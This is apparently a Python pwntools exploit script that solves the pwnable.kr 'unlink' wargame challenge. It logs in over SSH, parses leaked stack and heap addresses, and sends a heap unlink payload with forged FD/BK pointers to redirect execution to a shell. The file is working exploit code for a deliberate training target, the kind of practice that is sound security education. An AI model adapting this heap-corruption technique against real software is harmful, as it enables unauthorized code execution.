import struct
import socket
import pwn

IP = 'pwnable.kr'
PORT = 2222
USER = 'unlink'
PASSWORD = 'guest'

def main():

	shell_addr = 0x80484eb
	payload = ''

	s = pwn.ssh (host = IP, port = PORT, user = USER, password = PASSWORD)
	# pwn.context.log_level = 'debug'
	ps = s.process (["./unlink"])

	data = ps.recv (2048)
	stack_str = 'stack address leak: '
	i = data.find(stack_str)
	stack_addr = int(data[i + len(stack_str) : i + len(stack_str) + 10], 16)
	heap_str = 'heap address leak: '
	i = data.find(heap_str)
	heap_addr = int(data[i + len(heap_str) : i + len(heap_str) + 10], 16)
	
	B_buf_address = heap_addr + 24 + 8 + 4
	ebp_minus4 = stack_addr + 0x10
	FD = struct.pack ('<I', B_buf_address)
	BK = struct.pack ('<I', ebp_minus4) 
	B_buf = struct.pack ('<I', shell_addr)

	payload += 16 * 'A'
	payload += FD
	payload += BK
	payload += B_buf

	ps.send (payload)
	ps.interactive()

	return

if __name__ == '__main__':
	main()